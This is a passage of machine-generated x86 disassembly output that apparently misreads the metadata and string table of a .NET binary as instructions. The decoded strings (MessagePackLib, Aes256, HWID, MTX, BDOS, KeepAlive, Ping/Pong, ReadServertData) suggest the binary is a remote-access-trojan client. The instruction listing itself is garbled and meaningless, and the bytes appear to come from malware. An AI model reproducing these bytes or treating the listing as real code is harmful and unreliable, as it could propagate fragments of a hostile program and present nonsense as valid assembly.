  40770e:	59                   	pop    %ecx
  40770f:	06                   	push   %es
  407710:	80 06 e3             	addb   $0xe3,(%esi)
  407713:	06                   	push   %es
  407714:	0b 07                	or     (%edi),%eax
  407716:	00 01                	add    %al,(%ecx)
  407718:	71 00                	jno    0x40771a
  40771a:	0c 1c                	or     $0x1c,%al
  40771c:	01 00                	add    %eax,(%eax)
  40771e:	00 01                	add    %al,(%ecx)
  407720:	73 00                	jae    0x407722
  407722:	f7 1b                	negl   (%ebx)
  407724:	01 00                	add    %eax,(%eax)
  407726:	00 01                	add    %al,(%ecx)
  407728:	75 00                	jne    0x40772a
  40772a:	e6 05                	out    %al,$0x5
  40772c:	02 00                	add    (%eax),%al
  40772e:	41                   	inc    %ecx
  40772f:	01 77 00             	add    %esi,0x0(%edi)
  407732:	0d 1b 02 00 40       	or     $0x4000021b,%eax
  407737:	01 79 00             	add    %edi,0x0(%ecx)
  40773a:	ba 08 02 00 40       	mov    $0x40000208,%edx
  40773f:	01 7b 00             	add    %edi,0x0(%ebx)
  407742:	7e 0e                	jle    0x407752
  407744:	03 00                	add    (%eax),%eax
  407746:	50                   	push   %eax
  407747:	20 00                	and    %al,(%eax)
  407749:	00 2d 00 70 20 00    	add    %ch,0x207000
  40774f:	00 47 00             	add    %al,0x0(%edi)
  407752:	04 80                	add    $0x80,%al
  407754:	00 00                	add    %al,(%eax)
  407756:	01 00                	add    %eax,(%eax)
	...
  407764:	21 1a                	and    %ebx,(%edx)
  407766:	00 00                	add    %al,(%eax)
  407768:	04 00                	add    $0x0,%al
	...
  407772:	00 00                	add    %al,(%eax)
  407774:	01 00                	add    %eax,(%eax)
  407776:	b8 02 00 00 00       	mov    $0x2,%eax
  40777b:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  407786:	00 00                	add    %al,(%eax)
  407788:	01 00                	add    %eax,(%eax)
  40778a:	ee                   	out    %al,(%dx)
  40778b:	0f 00 00             	sldt   (%eax)
  40778e:	00 00                	add    %al,(%eax)
  407790:	04 00                	add    $0x0,%al
	...
  40779a:	00 00                	add    %al,(%eax)
  40779c:	cc                   	int3
  40779d:	00 d4                	add    %dl,%ah
  40779f:	0c 00                	or     $0x0,%al
  4077a1:	00 00                	add    %al,(%eax)
  4077a3:	00 04 00             	add    %al,(%eax,%eax,1)
  4077a6:	00 00                	add    %al,(%eax)
  4077a8:	00 00                	add    %al,(%eax)
  4077aa:	00 00                	add    %al,(%eax)
  4077ac:	70 00                	jo     0x4077ae
  4077ae:	00 00                	add    %al,(%eax)
  4077b0:	01 00                	add    %eax,(%eax)
  4077b2:	42                   	inc    %edx
  4077b3:	08 00                	or     %al,(%eax)
  4077b5:	00 00                	add    %al,(%eax)
  4077b7:	00 0a                	add    %cl,(%edx)
	...
  4077c1:	00 00                	add    %al,(%eax)
  4077c3:	00 cc                	add    %cl,%ah
  4077c5:	00 dc                	add    %bl,%ah
  4077c7:	02 00                	add    (%eax),%al
  4077c9:	00 00                	add    %al,(%eax)
  4077cb:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  4077d6:	00 00                	add    %al,(%eax)
  4077d8:	cc                   	int3
  4077d9:	00 8b 1a 00 00 00    	add    %cl,0x1a(%ebx)
  4077df:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  4077ea:	00 00                	add    %al,(%eax)
  4077ec:	01 00                	add    %eax,(%eax)
  4077ee:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  4077ef:	17                   	pop    %ss
  4077f0:	00 00                	add    %al,(%eax)
  4077f2:	00 00                	add    %al,(%eax)
  4077f4:	04 00                	add    $0x0,%al
  4077f6:	00 00                	add    %al,(%eax)
  4077f8:	00 00                	add    %al,(%eax)
  4077fa:	00 00                	add    %al,(%eax)
  4077fc:	70 00                	jo     0x4077fe
  4077fe:	00 00                	add    %al,(%eax)
  407800:	cc                   	int3
  407801:	00 95 12 00 00 00    	add    %dl,0x12(%ebp)
  407807:	00 0c 00             	add    %cl,(%eax,%eax,1)
  40780a:	0b 00                	or     (%eax),%eax
  40780c:	10 00                	adc    %al,(%eax)
  40780e:	0f 00 14 00          	lldt   (%eax,%eax,1)
  407812:	13 00                	adc    (%eax),%eax
  407814:	1e                   	push   %ds
  407815:	00 1d 00 75 01 71    	add    %bl,0x71017500
  40781b:	06                   	push   %es
  40781c:	00 41 63             	add    %al,0x63(%ecx)
  40781f:	74 69                	je     0x40788a
  407821:	6f                   	outsl  %ds:(%esi),(%dx)
  407822:	6e                   	outsb  %ds:(%esi),(%dx)
  407823:	60                   	pusha
  407824:	31 30                	xor    %esi,(%eax)
  407826:	00 3c 3e             	add    %bh,(%esi,%edi,1)
  407829:	70 5f                	jo     0x40788a
  40782b:	5f                   	pop    %edi
  40782c:	30 00                	xor    %al,(%eax)
  40782e:	49                   	dec    %ecx
  40782f:	45                   	inc    %ebp
  407830:	6e                   	outsb  %ds:(%esi),(%dx)
  407831:	75 6d                	jne    0x4078a0
  407833:	65 72 61             	gs jb  0x407897
  407836:	62 6c 65 60          	bound  %ebp,0x60(%ebp,%eiz,2)
  40783a:	31 00                	xor    %eax,(%eax)
  40783c:	43                   	inc    %ebx
  40783d:	61                   	popa
  40783e:	6c                   	insb   (%dx),%es:(%edi)
  40783f:	6c                   	insb   (%dx),%es:(%edi)
  407840:	53                   	push   %ebx
  407841:	69 74 65 60 31 00 4c 	imul   $0x694c0031,0x60(%ebp,%eiz,2),%esi
  407848:	69 
  407849:	73 74                	jae    0x4078bf
  40784b:	60                   	pusha
  40784c:	31 00                	xor    %eax,(%eax)
  40784e:	61                   	popa
  40784f:	31 00                	xor    %eax,(%eax)
  407851:	76 31                	jbe    0x407884
  407853:	00 5f 5f             	add    %bl,0x5f(%edi)
  407856:	53                   	push   %ebx
  407857:	74 61                	je     0x4078ba
  407859:	74 69                	je     0x4078c4
  40785b:	63 41 72             	arpl   %eax,0x72(%ecx)
  40785e:	72 61                	jb     0x4078c1
  407860:	79 49                	jns    0x4078ab
  407862:	6e                   	outsb  %ds:(%esi),(%dx)
  407863:	69 74 54 79 70 65 53 	imul   $0x69536570,0x79(%esp,%edx,2),%esi
  40786a:	69 
  40786b:	7a 65                	jp     0x4078d2
  40786d:	3d 33 32 00 4d       	cmp    $0x4d003233,%eax
  407872:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  407879:	74 2e                	je     0x4078a9
  40787b:	57                   	push   %edi
  40787c:	69 6e 33 32 00 54 6f 	imul   $0x6f540032,0x33(%esi),%ebp
  407883:	55                   	push   %ebp
  407884:	49                   	dec    %ecx
  407885:	6e                   	outsb  %ds:(%esi),(%dx)
  407886:	74 33                	je     0x4078bb
  407888:	32 00                	xor    (%eax),%al
  40788a:	54                   	push   %esp
  40788b:	6f                   	outsl  %ds:(%esi),(%dx)
  40788c:	49                   	dec    %ecx
  40788d:	6e                   	outsb  %ds:(%esi),(%dx)
  40788e:	74 33                	je     0x4078c3
  407890:	32 00                	xor    (%eax),%al
  407892:	53                   	push   %ebx
  407893:	77 61                	ja     0x4078f6
  407895:	70 49                	jo     0x4078e0
  407897:	6e                   	outsb  %ds:(%esi),(%dx)
  407898:	74 33                	je     0x4078cd
  40789a:	32 00                	xor    (%eax),%al
  40789c:	3c 3e                	cmp    $0x3e,%al
  40789e:	6f                   	outsl  %ds:(%esi),(%dx)
  40789f:	5f                   	pop    %edi
  4078a0:	5f                   	pop    %edi
  4078a1:	32 00                	xor    (%eax),%al
  4078a3:	61                   	popa
  4078a4:	32 00                	xor    (%eax),%al
  4078a6:	58                   	pop    %eax
  4078a7:	35 30 39 43 65       	xor    $0x65433930,%eax
  4078ac:	72 74                	jb     0x407922
  4078ae:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  4078b5:	32 00                	xor    (%eax),%al
  4078b7:	76 32                	jbe    0x4078eb
  4078b9:	00 76 33             	add    %dh,0x33(%esi)
  4078bc:	00 57 72             	add    %dl,0x72(%edi)
  4078bf:	69 74 65 55 49 6e 74 	imul   $0x36746e49,0x55(%ebp,%eiz,2),%esi
  4078c6:	36 
  4078c7:	34 00                	xor    $0x0,%al
  4078c9:	54                   	push   %esp
  4078ca:	6f                   	outsl  %ds:(%esi),(%dx)
  4078cb:	55                   	push   %ebp
  4078cc:	49                   	dec    %ecx
  4078cd:	6e                   	outsb  %ds:(%esi),(%dx)
  4078ce:	74 36                	je     0x407906
  4078d0:	34 00                	xor    $0x0,%al
  4078d2:	47                   	inc    %edi
  4078d3:	65 74 41             	gs je  0x407917
  4078d6:	73 55                	jae    0x40792d
  4078d8:	49                   	dec    %ecx
  4078d9:	6e                   	outsb  %ds:(%esi),(%dx)
  4078da:	74 36                	je     0x407912
  4078dc:	34 00                	xor    $0x0,%al
  4078de:	53                   	push   %ebx
  4078df:	65 74 41             	gs je  0x407923
  4078e2:	73 55                	jae    0x407939
  4078e4:	49                   	dec    %ecx
  4078e5:	6e                   	outsb  %ds:(%esi),(%dx)
  4078e6:	74 36                	je     0x40791e
  4078e8:	34 00                	xor    $0x0,%al
  4078ea:	54                   	push   %esp
  4078eb:	6f                   	outsl  %ds:(%esi),(%dx)
  4078ec:	49                   	dec    %ecx
  4078ed:	6e                   	outsb  %ds:(%esi),(%dx)
  4078ee:	74 36                	je     0x407926
  4078f0:	34 00                	xor    $0x0,%al
  4078f2:	53                   	push   %ebx
  4078f3:	77 61                	ja     0x407956
  4078f5:	70 49                	jo     0x407940
  4078f7:	6e                   	outsb  %ds:(%esi),(%dx)
  4078f8:	74 36                	je     0x407930
  4078fa:	34 00                	xor    $0x0,%al
  4078fc:	54                   	push   %esp
  4078fd:	6f                   	outsl  %ds:(%esi),(%dx)
  4078fe:	55                   	push   %ebp
  4078ff:	49                   	dec    %ecx
  407900:	6e                   	outsb  %ds:(%esi),(%dx)
  407901:	74 31                	je     0x407934
  407903:	36 00 54 6f 49       	add    %dl,%ss:0x49(%edi,%ebp,2)
  407908:	6e                   	outsb  %ds:(%esi),(%dx)
  407909:	74 31                	je     0x40793c
  40790b:	36 00 53 77          	add    %dl,%ss:0x77(%ebx)
  40790f:	61                   	popa
  407910:	70 49                	jo     0x40795b
  407912:	6e                   	outsb  %ds:(%esi),(%dx)
  407913:	74 31                	je     0x407946
  407915:	36 00 48 4d          	add    %cl,%ss:0x4d(%eax)
  407919:	41                   	inc    %ecx
  40791a:	43                   	inc    %ebx
  40791b:	53                   	push   %ebx
  40791c:	48                   	dec    %eax
  40791d:	41                   	inc    %ecx
  40791e:	32 35 36 00 53 68    	xor    0x68530036,%dh
  407924:	61                   	popa
  407925:	32 35 36 00 41 65    	xor    0x65410036,%dh
  40792b:	73 32                	jae    0x40795f
  40792d:	35 36 00 61 65       	xor    $0x65610036,%eax
  407932:	73 32                	jae    0x407966
  407934:	35 36 00 5f 5f       	xor    $0x5f5f0036,%eax
  407939:	53                   	push   %ebx
  40793a:	74 61                	je     0x40799d
  40793c:	74 69                	je     0x4079a7
  40793e:	63 41 72             	arpl   %eax,0x72(%ecx)
  407941:	72 61                	jb     0x4079a4
  407943:	79 49                	jns    0x40798e
  407945:	6e                   	outsb  %ds:(%esi),(%dx)
  407946:	69 74 54 79 70 65 53 	imul   $0x69536570,0x79(%esp,%edx,2),%esi
  40794d:	69 
  40794e:	7a 65                	jp     0x4079b5
  407950:	3d 36 00 67 65       	cmp    $0x65670036,%eax
  407955:	74 5f                	je     0x4079b6
  407957:	55                   	push   %ebp
  407958:	54                   	push   %esp
  407959:	46                   	inc    %esi
  40795a:	38 00                	cmp    %al,(%eax)
  40795c:	3c 4d                	cmp    $0x4d,%al
  40795e:	6f                   	outsl  %ds:(%esi),(%dx)
  40795f:	64 75 6c             	fs jne 0x4079ce
  407962:	65 3e 00 4d 65       	gs add %cl,%ds:0x65(%ebp)
  407967:	73 73                	jae    0x4079dc
  407969:	61                   	popa
  40796a:	67 65 50             	addr16 gs push %eax
  40796d:	61                   	popa
  40796e:	63 6b 4c             	arpl   %ebp,0x4c(%ebx)
  407971:	69 62 2e 3c 50 72 69 	imul   $0x6972503c,0x2e(%edx),%esp
  407978:	76 61                	jbe    0x4079db
  40797a:	74 65                	je     0x4079e1
  40797c:	49                   	dec    %ecx
  40797d:	6d                   	insl   (%dx),%es:(%edi)
  40797e:	70 6c                	jo     0x4079ec
  407980:	65 6d                	gs insl (%dx),%es:(%edi)
  407982:	65 6e                	outsb  %gs:(%esi),(%dx)
  407984:	74 61                	je     0x4079e7
  407986:	74 69                	je     0x4079f1
  407988:	6f                   	outsl  %ds:(%esi),(%dx)
  407989:	6e                   	outsb  %ds:(%esi),(%dx)
  40798a:	44                   	inc    %esp
  40798b:	65 74 61             	gs je  0x4079ef
  40798e:	69 6c 73 3e 00 31 44 	imul   $0x42443100,0x3e(%ebx,%esi,2),%ebp
  407995:	42 
  407996:	32 41 31             	xor    0x31(%ecx),%al
  407999:	46                   	inc    %esi
  40799a:	39 39                	cmp    %edi,(%ecx)
  40799c:	30 32                	xor    %dh,(%edx)
  40799e:	42                   	inc    %edx
  40799f:	33 35 46 38 46 38    	xor    0x38463846,%esi
  4079a5:	38 30                	cmp    %dh,(%eax)
  4079a7:	45                   	inc    %ebp
  4079a8:	46                   	inc    %esi
  4079a9:	31 36                	xor    %esi,(%esi)
  4079ab:	39 32                	cmp    %esi,(%edx)
  4079ad:	43                   	inc    %ebx
  4079ae:	45                   	inc    %ebp
  4079af:	39 39                	cmp    %edi,(%ecx)
  4079b1:	34 37                	xor    $0x37,%al
  4079b3:	41                   	inc    %ecx
  4079b4:	31 39                	xor    %edi,(%ecx)
  4079b6:	33 44 35 41          	xor    0x41(%ebp,%esi,1),%eax
  4079ba:	36 39 38             	cmp    %edi,%ss:(%eax)
  4079bd:	44                   	inc    %esp
  4079be:	38 46 35             	cmp    %al,0x35(%esi)
  4079c1:	36 38 42 44          	cmp    %al,%ss:0x44(%edx)
  4079c5:	41                   	inc    %ecx
  4079c6:	37                   	aaa
  4079c7:	32 31                	xor    (%ecx),%dh
  4079c9:	36 35 38 45 44 34    	ss xor $0x34444538,%eax
  4079cf:	43                   	inc    %ebx
  4079d0:	35 38 42 00 47       	xor    $0x47004238,%eax
  4079d5:	43                   	inc    %ebx
  4079d6:	00 45 53             	add    %al,0x53(%ebp)
  4079d9:	5f                   	pop    %edi
  4079da:	53                   	push   %ebx
  4079db:	59                   	pop    %ecx
  4079dc:	53                   	push   %ebx
  4079dd:	54                   	push   %esp
  4079de:	45                   	inc    %ebp
  4079df:	4d                   	dec    %ebp
  4079e0:	5f                   	pop    %edi
  4079e1:	52                   	push   %edx
  4079e2:	45                   	inc    %ebp
  4079e3:	51                   	push   %ecx
  4079e4:	55                   	push   %ebp
  4079e5:	49                   	dec    %ecx
  4079e6:	52                   	push   %edx
  4079e7:	45                   	inc    %ebp
  4079e8:	44                   	inc    %esp
  4079e9:	00 45 53             	add    %al,0x53(%ebp)
  4079ec:	5f                   	pop    %edi
  4079ed:	44                   	inc    %esp
  4079ee:	49                   	dec    %ecx
  4079ef:	53                   	push   %ebx
  4079f0:	50                   	push   %eax
  4079f1:	4c                   	dec    %esp
  4079f2:	41                   	inc    %ecx
  4079f3:	59                   	pop    %ecx
  4079f4:	5f                   	pop    %edi
  4079f5:	52                   	push   %edx
  4079f6:	45                   	inc    %ebp
  4079f7:	51                   	push   %ecx
  4079f8:	55                   	push   %ebp
  4079f9:	49                   	dec    %ecx
  4079fa:	52                   	push   %edx
  4079fb:	45                   	inc    %ebp
  4079fc:	44                   	inc    %esp
  4079fd:	00 4d 61             	add    %cl,0x61(%ebp)
  407a00:	70 4e                	jo     0x407a50
  407a02:	61                   	popa
  407a03:	6d                   	insl   (%dx),%es:(%edi)
  407a04:	65 54                	gs push %esp
  407a06:	6f                   	outsl  %ds:(%esi),(%dx)
  407a07:	4f                   	dec    %edi
  407a08:	49                   	dec    %ecx
  407a09:	44                   	inc    %esp
  407a0a:	00 48 57             	add    %cl,0x57(%eax)
  407a0d:	49                   	dec    %ecx
  407a0e:	44                   	inc    %esp
  407a0f:	00 67 65             	add    %ah,0x65(%edi)
  407a12:	74 5f                	je     0x407a73
  407a14:	46                   	inc    %esi
  407a15:	6f                   	outsl  %ds:(%esi),(%dx)
  407a16:	72 6d                	jb     0x407a85
  407a18:	61                   	popa
  407a19:	74 49                	je     0x407a64
  407a1b:	44                   	inc    %esp
  407a1c:	00 45 58             	add    %al,0x58(%ebp)
  407a1f:	45                   	inc    %ebp
  407a20:	43                   	inc    %ebx
  407a21:	55                   	push   %ebp
  407a22:	54                   	push   %esp
  407a23:	49                   	dec    %ecx
  407a24:	4f                   	dec    %edi
  407a25:	4e                   	dec    %esi
  407a26:	5f                   	pop    %edi
  407a27:	53                   	push   %ebx
  407a28:	54                   	push   %esp
  407a29:	41                   	inc    %ecx
  407a2a:	54                   	push   %esp
  407a2b:	45                   	inc    %ebp
  407a2c:	00 38                	add    %bh,(%eax)
  407a2e:	37                   	aaa
  407a2f:	36 33 39             	xor    %ss:(%ecx),%edi
  407a32:	31 32                	xor    %esi,(%edx)
  407a34:	36 45                	ss inc %ebp
  407a36:	41                   	inc    %ecx
  407a37:	37                   	aaa
  407a38:	37                   	aaa
  407a39:	42                   	inc    %edx
  407a3a:	33 35 38 46 32 36    	xor    0x36324638,%esi
  407a40:	35 33 32 33 36       	xor    $0x36333233,%eax
  407a45:	37                   	aaa
  407a46:	44                   	inc    %esp
  407a47:	42                   	inc    %edx
  407a48:	41                   	inc    %ecx
  407a49:	36 37                	ss aaa
  407a4b:	43                   	inc    %ebx
  407a4c:	35 33 31 30 45       	xor    $0x45303133,%eax
  407a51:	46                   	inc    %esi
  407a52:	35 30 41 38 44       	xor    $0x44384130,%eax
  407a57:	39 38                	cmp    %edi,(%eax)
  407a59:	38 38                	cmp    %bh,(%eax)
  407a5b:	45                   	inc    %ebp
  407a5c:	44                   	inc    %esp
  407a5d:	30 37                	xor    %dh,(%edi)
  407a5f:	30 43 44             	xor    %al,0x44(%ebx)
  407a62:	34 30                	xor    $0x30,%al
  407a64:	45                   	inc    %ebp
  407a65:	31 46 36             	xor    %eax,0x36(%esi)
  407a68:	30 35 41 38 46 00    	xor    %dh,0x463841
  407a6e:	67 65 74 5f          	addr16 gs je 0x407ad1
  407a72:	41                   	inc    %ecx
  407a73:	53                   	push   %ebx
  407a74:	43                   	inc    %ebx
  407a75:	49                   	dec    %ecx
  407a76:	49                   	dec    %ecx
  407a77:	00 53 79             	add    %dl,0x79(%ebx)
  407a7a:	73 74                	jae    0x407af0
  407a7c:	65 6d                	gs insl (%dx),%es:(%edi)
  407a7e:	2e 49                	cs dec %ecx
  407a80:	4f                   	dec    %edi
  407a81:	00 49 73             	add    %cl,0x73(%ecx)
  407a84:	58                   	pop    %eax
  407a85:	50                   	push   %eax
  407a86:	00 42 44             	add    %al,0x44(%edx)
  407a89:	4f                   	dec    %edi
  407a8a:	53                   	push   %ebx
  407a8b:	00 45 53             	add    %al,0x53(%ebp)
  407a8e:	5f                   	pop    %edi
  407a8f:	43                   	inc    %ebx
  407a90:	4f                   	dec    %edi
  407a91:	4e                   	dec    %esi
  407a92:	54                   	push   %esp
  407a93:	49                   	dec    %ecx
  407a94:	4e                   	dec    %esi
  407a95:	55                   	push   %ebp
  407a96:	4f                   	dec    %edi
  407a97:	55                   	push   %ebp
  407a98:	53                   	push   %ebx
  407a99:	00 67 65             	add    %ah,0x65(%edi)
  407a9c:	74 5f                	je     0x407afd
  407a9e:	49                   	dec    %ecx
  407a9f:	56                   	push   %esi
  407aa0:	00 73 65             	add    %dh,0x65(%ebx)
  407aa3:	74 5f                	je     0x407b04
  407aa5:	49                   	dec    %ecx
  407aa6:	56                   	push   %esi
  407aa7:	00 47 65             	add    %al,0x65(%edi)
  407aaa:	6e                   	outsb  %ds:(%esi),(%dx)
  407aab:	65 72 61             	gs jb  0x407b0f
  407aae:	74 65                	je     0x407b15
  407ab0:	49                   	dec    %ecx
  407ab1:	56                   	push   %esi
  407ab2:	00 4d 54             	add    %cl,0x54(%ebp)
  407ab5:	58                   	pop    %eax
  407ab6:	00 76 61             	add    %dh,0x61(%esi)
  407ab9:	6c                   	insb   (%dx),%es:(%edi)
  407aba:	75 65                	jne    0x407b21
  407abc:	5f                   	pop    %edi
  407abd:	5f                   	pop    %edi
  407abe:	00 52 65             	add    %dl,0x65(%edx)
  407ac1:	61                   	popa
  407ac2:	64 53                	fs push %ebx
  407ac4:	65 72 76             	gs jb  0x407b3d
  407ac7:	65 72 74             	gs jb  0x407b3e
  407aca:	44                   	inc    %esp
  407acb:	61                   	popa
  407acc:	74 61                	je     0x407b2f
  407ace:	00 64 61 74          	add    %ah,0x74(%ecx,%eiz,2)
  407ad2:	61                   	popa
  407ad3:	00 6d 73             	add    %ch,0x73(%ebp)
  407ad6:	63 6f 72             	arpl   %ebp,0x72(%edi)
  407ad9:	6c                   	insb   (%dx),%es:(%edi)
  407ada:	69 62 00 53 79 73 74 	imul   $0x74737953,0x0(%edx),%esp
  407ae1:	65 6d                	gs insl (%dx),%es:(%edi)
  407ae3:	2e 43                	cs inc %ebx
  407ae5:	6f                   	outsl  %ds:(%esi),(%dx)
  407ae6:	6c                   	insb   (%dx),%es:(%edi)
  407ae7:	6c                   	insb   (%dx),%es:(%edi)
  407ae8:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  407aed:	6e                   	outsb  %ds:(%esi),(%dx)
  407aee:	73 2e                	jae    0x407b1e
  407af0:	47                   	inc    %edi
  407af1:	65 6e                	outsb  %gs:(%esi),(%dx)
  407af3:	65 72 69             	gs jb  0x407b5f
  407af6:	63 00                	arpl   %eax,(%eax)
  407af8:	4d                   	dec    %ebp
  407af9:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  407b00:	74 2e                	je     0x407b30
  407b02:	56                   	push   %esi
  407b03:	69 73 75 61 6c 42 61 	imul   $0x61426c61,0x75(%ebx),%esi
  407b0a:	73 69                	jae    0x407b75
  407b0c:	63 00                	arpl   %eax,(%eax)
  407b0e:	67 65 74 5f          	addr16 gs je 0x407b71
  407b12:	53                   	push   %ebx
  407b13:	65 6e                	outsb  %gs:(%esi),(%dx)
  407b15:	64 53                	fs push %ebx
  407b17:	79 6e                	jns    0x407b87
  407b19:	63 00                	arpl   %eax,(%eax)
  407b1b:	45                   	inc    %ebp
  407b1c:	6e                   	outsb  %ds:(%esi),(%dx)
  407b1d:	64 52                	fs push %edx
  407b1f:	65 61                	gs popa
  407b21:	64 00 42 65          	add    %al,%fs:0x65(%edx)
  407b25:	67 69 6e 52 65 61 64 	imul   $0x646165,0x52(%bp),%ebp
  407b2c:	00 
  407b2d:	54                   	push   %esp
  407b2e:	68 72 65 61 64       	push   $0x64616572
  407b33:	00 4c 6f 61          	add    %cl,0x61(%edi,%ebp,2)
  407b37:	64 00 49 6e          	add    %cl,%fs:0x6e(%ecx)
  407b3b:	6e                   	outsb  %ds:(%esi),(%dx)
  407b3c:	65 72 41             	gs jb  0x407b80
  407b3f:	64 64 00 53 48       	fs add %dl,%fs:0x48(%ebx)
  407b44:	41                   	inc    %ecx
  407b45:	32 35 36 4d 61 6e    	xor    0x6e614d36,%dh
  407b4b:	61                   	popa
  407b4c:	67 65 64 00 67 65    	gs add %ah,%fs:0x65(%bx)
  407b52:	74 5f                	je     0x407bb3
  407b54:	43                   	inc    %ebx
  407b55:	6f                   	outsl  %ds:(%esi),(%dx)
  407b56:	6e                   	outsb  %ds:(%esi),(%dx)
  407b57:	6e                   	outsb  %ds:(%esi),(%dx)
  407b58:	65 63 74 65 64       	arpl   %esi,%gs:0x64(%ebp,%eiz,2)
  407b5d:	00 67 65             	add    %ah,0x65(%edi)
  407b60:	74 5f                	je     0x407bc1
  407b62:	49                   	dec    %ecx
  407b63:	73 43                	jae    0x407ba8
  407b65:	6f                   	outsl  %ds:(%esi),(%dx)
  407b66:	6e                   	outsb  %ds:(%esi),(%dx)
  407b67:	6e                   	outsb  %ds:(%esi),(%dx)
  407b68:	65 63 74 65 64       	arpl   %esi,%gs:0x64(%ebp,%eiz,2)
  407b6d:	00 73 65             	add    %dh,0x65(%ebx)
  407b70:	74 5f                	je     0x407bd1
  407b72:	49                   	dec    %ecx
  407b73:	73 43                	jae    0x407bb8
  407b75:	6f                   	outsl  %ds:(%esi),(%dx)
  407b76:	6e                   	outsb  %ds:(%esi),(%dx)
  407b77:	6e                   	outsb  %ds:(%esi),(%dx)
  407b78:	65 63 74 65 64       	arpl   %esi,%gs:0x64(%ebp,%eiz,2)
  407b7d:	00 52 65             	add    %dl,0x65(%edx)
  407b80:	63 65 69             	arpl   %esp,0x69(%ebp)
  407b83:	76 65                	jbe    0x407bea
  407b85:	64 00 67 65          	add    %ah,%fs:0x65(%edi)
  407b89:	74 5f                	je     0x407bea
  407b8b:	47                   	inc    %edi
  407b8c:	75 69                	jne    0x407bf7
  407b8e:	64 00 48 77          	add    %cl,%fs:0x77(%eax)
  407b92:	69 64 00 3c 53 65 6e 	imul   $0x646e6553,0x3c(%eax,%eax,1),%esp
  407b99:	64 
  407b9a:	53                   	push   %ebx
  407b9b:	79 6e                	jns    0x407c0b
  407b9d:	63 3e                	arpl   %edi,(%esi)
  407b9f:	6b 5f 5f 42          	imul   $0x42,0x5f(%edi),%ebx
  407ba3:	61                   	popa
  407ba4:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  407ba7:	6e                   	outsb  %ds:(%esi),(%dx)
  407ba8:	67 46                	addr16 inc %esi
  407baa:	69 65 6c 64 00 3c 49 	imul   $0x493c0064,0x6c(%ebp),%esp
  407bb1:	73 43                	jae    0x407bf6
  407bb3:	6f                   	outsl  %ds:(%esi),(%dx)
  407bb4:	6e                   	outsb  %ds:(%esi),(%dx)
  407bb5:	6e                   	outsb  %ds:(%esi),(%dx)
  407bb6:	65 63 74 65 64       	arpl   %esi,%gs:0x64(%ebp,%eiz,2)
  407bbb:	3e 6b 5f 5f 42       	imul   $0x42,%ds:0x5f(%edi),%ebx
  407bc0:	61                   	popa
  407bc1:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  407bc4:	6e                   	outsb  %ds:(%esi),(%dx)
  407bc5:	67 46                	addr16 inc %esi
  407bc7:	69 65 6c 64 00 3c 4b 	imul   $0x4b3c0064,0x6c(%ebp),%esp
  407bce:	65 65 70 41          	gs gs jo 0x407c13
  407bd2:	6c                   	insb   (%dx),%es:(%edi)
  407bd3:	69 76 65 3e 6b 5f 5f 	imul   $0x5f5f6b3e,0x65(%esi),%esi
  407bda:	42                   	inc    %edx
  407bdb:	61                   	popa
  407bdc:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  407bdf:	6e                   	outsb  %ds:(%esi),(%dx)
  407be0:	67 46                	addr16 inc %esi
  407be2:	69 65 6c 64 00 3c 48 	imul   $0x483c0064,0x6c(%ebp),%esp
  407be9:	65 61                	gs popa
  407beb:	64 65 72 53          	fs gs jb 0x407c42
  407bef:	69 7a 65 3e 6b 5f 5f 	imul   $0x5f5f6b3e,0x65(%edx),%edi
  407bf6:	42                   	inc    %edx
  407bf7:	61                   	popa
  407bf8:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  407bfb:	6e                   	outsb  %ds:(%esi),(%dx)
  407bfc:	67 46                	addr16 inc %esi
  407bfe:	69 65 6c 64 00 3c 50 	imul   $0x503c0064,0x6c(%ebp),%esp
  407c05:	69 6e 67 3e 6b 5f 5f 	imul   $0x5f5f6b3e,0x67(%esi),%ebp
  407c0c:	42                   	inc    %edx
  407c0d:	61                   	popa
  407c0e:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  407c11:	6e                   	outsb  %ds:(%esi),(%dx)
  407c12:	67 46                	addr16 inc %esi
  407c14:	69 65 6c 64 00 3c 41 	imul   $0x413c0064,0x6c(%ebp),%esp
  407c1b:	63 74 69 76          	arpl   %esi,0x76(%ecx,%ebp,2)
  407c1f:	61                   	popa
  407c20:	74 65                	je     0x407c87
  407c22:	50                   	push   %eax
  407c23:	6f                   	outsl  %ds:(%esi),(%dx)
  407c24:	6e                   	outsb  %ds:(%esi),(%dx)
  407c25:	67 3e 6b 5f 5f 42    	imul   $0x42,%ds:0x5f(%bx),%ebx
  407c2b:	61                   	popa
  407c2c:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  407c2f:	6e                   	outsb  %ds:(%esi),(%dx)
  407c30:	67 46                	addr16 inc %esi
  407c32:	69 65 6c 64 00 3c 49 	imul   $0x493c0064,0x6c(%ebp),%esp
  407c39:	6e                   	outsb  %ds:(%esi),(%dx)
  407c3a:	74 65                	je     0x407ca1
  407c3c:	72 76                	jb     0x407cb4
  407c3e:	61                   	popa
  407c3f:	6c                   	insb   (%dx),%es:(%edi)
  407c40:	3e 6b 5f 5f 42       	imul   $0x42,%ds:0x5f(%edi),%ebx
  407c45:	61                   	popa
  407c46:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  407c49:	6e                   	outsb  %ds:(%esi),(%dx)
  407c4a:	67 46                	addr16 inc %esi
  407c4c:	69 65 6c 64 00 3c 42 	imul   $0x423c0064,0x6c(%ebp),%esp
  407c53:	75 66                	jne    0x407cbb
  407c55:	66 65 72 3e          	data16 gs jb 0x407c97
  407c59:	6b 5f 5f 42          	imul   $0x42,0x5f(%edi),%ebx
  407c5d:	61                   	popa
  407c5e:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  407c61:	6e                   	outsb  %ds:(%esi),(%dx)
  407c62:	67 46                	addr16 inc %esi
  407c64:	69 65 6c 64 00 3c 4f 	imul   $0x4f3c0064,0x6c(%ebp),%esp
  407c6b:	66 66 73 65          	data16 data16 jae 0x407cd4
